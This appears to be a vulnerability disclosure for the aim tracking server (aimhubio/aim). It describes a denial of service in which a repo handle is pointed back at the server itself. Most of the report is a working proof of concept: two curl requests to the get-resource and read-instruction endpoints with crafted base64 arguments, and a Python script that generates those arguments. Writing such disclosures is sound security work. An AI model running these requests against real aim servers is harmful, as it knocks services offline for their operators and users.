Title: Denial of service by pointing tracking server at itself in aimhubio/aim

Proof of Concept: 
Initialize a repository and run the tracking server by running

aim init
aim server

Create a handler reference to a new repo by running

curl --location 'http://HOST_IP:53800/tracking/client_1/get-resource' \
--header 'Content-Type: application/json' \
--data '{
"resource_handler": "my_resource",
"resource_type": "Repo",
"args": "AAAAAAABAAAABw=="
}'

Initialize a new repo pointing at the tracking server itself by running

curl --location 'http://HOST_IP:53800/tracking/client_1/read-instruction' \
--header 'Content-Type: application/json' \
--data '{
"resource_handler": "my_resource",
"method_name": "from_path",
"args": "AAAAAAABAAAABgoAAAD+AAAAAAAAAAD+ABQAAAAEYWltOi8vMC4wLjAuMDo1MzgwMA=="
}'

This uses the Repo.from_path class method.

The args data is generated by the following python script:

from aim.ext.transport.message_utils import encode_tree, pack_args, ResourceObject
from aim.sdk.objects.artifact import Artifact
import base64
import os
import pathlib

# For get-resource, the first request
# args = {}

args = ["aim://0.0.0.0:53800"]
res = base64.b64encode(pack_args(encode_tree(args))).decode()
print(res)

Try any request to the tracking server (i.e. repeating the first one), and observe that no response is given.

Impact: 
This vulnerability causes complete denial of service.
